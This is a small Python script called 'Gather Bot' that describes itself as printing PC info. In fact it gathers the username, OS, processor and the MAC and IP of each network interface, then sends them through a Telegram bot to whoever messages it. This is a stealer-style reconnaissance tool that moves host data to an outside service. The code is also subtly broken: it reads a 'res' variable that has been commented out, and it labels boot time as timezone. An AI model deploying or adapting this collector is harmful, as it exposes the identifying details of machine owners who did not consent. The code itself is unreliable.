# Gather Bot (No info flle).
# This script prints out info about PC.
#
# Nyukers (C)opyright, 2021.
#
# speedtest -> speedtest-cli
# telebot   -> PyTelegramBotAPI

import getpass
import os
#import socket
from datetime import datetime
#from uuid import getnode
#import pyautogui
import speedtest
import telebot
import psutil
import platform
#from PIL import Image
from netifaces import interfaces, ifaddresses, AF_INET, AF_LINK

bot = telebot.TeleBot("put_token_here")

start = datetime.now()

# Username, OS
name = getpass.getuser()
ost = platform.uname()

#ip = socket.gethostbyname(socket.getfqdn())
#mac = hex(uuid.getnode())

# NIC, IP, MAC
ip0 = ''
for ifaceName in interfaces():
    addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
    if addresses != ['No IP addr'] and addresses != ['127.0.0.1']:
        nic1 =  ifaceName
        mac1 =  ifaddresses(ifaceName)[AF_LINK][0]['addr']
        ip1  =  addresses[0]
        ip0 = ip0 + 'NIC: '+ nic1 +' MAC: ' + mac1 + ' IP: '+ ip1 +'\n'

# Download, Upload, Ping
inet = speedtest.Speedtest()
inet.get_best_server()
#download = float(str(inet.download())[0:2] + "." + str(round(inet.download(), 2))[1]) * 0.125
#uploads = float(str(inet.upload())[0:2] + "." + str(round(inet.upload(), 2))[1]) * 0.125
#res = inet.results.dict()
pingme = res["ping"]
#print(res["download"], res["upload"], res["ping"])

# Timezone	
zone = psutil.boot_time()
time = datetime.fromtimestamp(zone)

# CPU Frequency
cpu = psutil.cpu_freq()

ends = datetime.now()
workspeed = format(ends - start)

#file.write(f"[================================================]\n  Operating System: {ost.system}\n  Processor: {ost.processor}\n  Username: {name}\n  IP adress: {ip}\n  MAC adress: {mac}\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\n  Work speed: {workspeed}\n  Download: {download} MB/s\n  Upload: {uploads} MB/s\n  Max Frequency: {cpu.max:.2f} Mhz\n  Min Frequency: {cpu.min:.2f} Mhz\n  Current Frequency: {cpu.current:.2f} Mhz\n[================================================]\n")
text2 = "Operating System: "+ ost.system + "\nProcessor: "+ ost.processor+ "\nUsername: "+ name + "\nIP adress: " + ip0  
#print(text2)

# Bot
@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, text2)
    bot.stop_polling()
bot.polling()
